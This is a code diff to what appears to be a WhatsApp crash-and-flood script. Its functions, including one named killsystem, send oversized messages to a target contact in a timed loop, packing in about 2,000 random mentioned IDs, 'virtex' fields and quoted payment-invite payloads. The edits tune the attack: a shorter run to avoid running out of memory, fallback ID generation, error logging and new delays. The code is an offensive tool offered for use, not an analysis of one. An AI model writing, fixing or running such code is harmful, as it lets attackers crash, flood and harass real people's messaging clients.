@@ -153,8 +153,8 @@ async function C(SYxS7, target) {
                 mentionedJid: [target, "0@s.whatsapp.net", "13135550002@s.whatsapp.net", ...Array.from({
                   length: 1990
                 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
-                stanzaId: SYxS7.generateMessageTag(),
-                virtexId: SYxS7.generateMessageTag(),
+                stanzaId: typeof SYxS7.generateMessageTag === 'function' ? SYxS7.generateMessageTag() : crypto.randomBytes(4).toString('hex'),
+                virtexId: typeof SYxS7.generateMessageTag === 'function' ? SYxS7.generateMessageTag() : crypto.randomBytes(4).toString('hex'),
                 quotedMessage: {
                   paymentInviteMessage: {
                     serviceType: 3,
@@ -263,17 +263,18 @@ async function SABIR7718(SYxS7, target) {
 }
 
 async function killsystem(SYxS7, targetJid) {
-  const totalDurationMs = 60 * 60 * 1000;
+  const totalDurationMs = 10 * 60 * 1000; // 10 minutes to prevent OOM
   const startTime = Date.now();
 
   while (Date.now() - startTime < totalDurationMs) {
     try {
       await SABIR7718(SYxS7, targetJid);
-      await SABIR7718(SYxS7, targetJid);
+      await delay(2000);
     } catch (err) {
+      console.error("[killsystem] Loop error:", err.message);
     }
 
-    await new Promise(res => setTimeout(res, 2000));
+    await new Promise(res => setTimeout(res, 4000));
   }
 }
 
